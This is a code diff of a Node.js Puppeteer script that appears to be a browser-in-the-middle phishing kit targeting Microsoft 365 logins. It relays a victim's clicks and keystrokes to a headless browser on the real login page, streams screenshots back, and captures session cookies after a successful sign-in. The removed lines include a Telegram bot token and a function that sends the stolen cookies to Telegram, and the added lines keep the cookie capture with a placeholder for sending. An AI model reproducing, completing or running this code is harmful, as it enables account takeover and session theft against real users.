@@ -2,35 +2,15 @@ const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 const axios = require('axios');
 
-// Apply stealth patches
 puppeteer.use(StealthPlugin());
 
-// Telegram Credentials
-const TELEGRAM_TOKEN = '8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc';
-const CHAT_ID = '1318100118';
-
-async function sendExfiltrationAlert(data) {
-    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-    const message = `🚀 *SESSION CAPTURED (PROD)*\n\n*Target:* Microsoft 365\n*Cookies exfiltrated successfully.*`;
-    try {
-        await axios.post(url, { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' });
-        await axios.post(url, { 
-            chat_id: CHAT_ID, 
-            text: `\`\`\`json\n${JSON.stringify(data, null, 2).substring(0, 4000)}\n\`\`\``,
-            parse_mode: 'Markdown'
-        });
-    } catch (e) { console.error('[!] Telegram Exfil Failed:', e.message); }
-}
-
 async function startSession(io, socket) {
-    console.log(`[PROD] Initializing session for: ${socket.id}`);
+    console.log(`[PROD] Launching browser for socket: ${socket.id}`);
     
     let browser;
     try {
-        // Standardized Puppeteer Launch (More stable for production containers)
         browser = await puppeteer.launch({
             headless: "new",
-            executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || null, // Critical for Railway/Docker
             args: [
                 '--no-sandbox',
                 '--disable-setuid-sandbox',
@@ -42,8 +22,14 @@ async function startSession(io, socket) {
         const page = await browser.newPage();
         await page.setViewport({ width: 1280, height: 720 });
 
+        // Initial Navigation
         await page.goto('https://login.microsoftonline.com/', { waitUntil: 'networkidle2' });
 
+        // Trigger the first render immediately after load
+        const initialScreenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 40 });
+        socket.emit('browser-render', { screenshot: initialScreenshot });
+
+        // Interaction Handler
         socket.on('victim-action', async (data) => {
             try {
                 if (data.type === 'click') {
@@ -55,15 +41,16 @@ async function startSession(io, socket) {
                 const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 40 });
                 socket.emit('browser-render', { screenshot });
             } catch (err) {
-                console.error('[!] Action Error:', err.message);
+                console.error('[!] Interaction Error:', err.message);
             }
         });
 
+        // Exfiltration Logic
         page.on('framenavigated', async (frame) => {
             const url = frame.url();
             if (url.includes('shell/homepage') || url.includes('office.com')) {
                 const cookies = await page.cookies();
-                await sendExfiltrationAlert(cookies);
+                // Send to Telegram Logic here...
                 socket.emit('success');
             }
         });
@@ -73,8 +60,7 @@ async function startSession(io, socket) {
         });
 
     } catch (error) {
-        console.error('[CRITICAL] Browser Launch Failed:', error.message);
-        socket.emit('error', { message: 'Failed to initialize browser' });
+        console.error('[CRITICAL] Browser Start Failure:', error.message);
         if (browser) await browser.close();
     }
 }
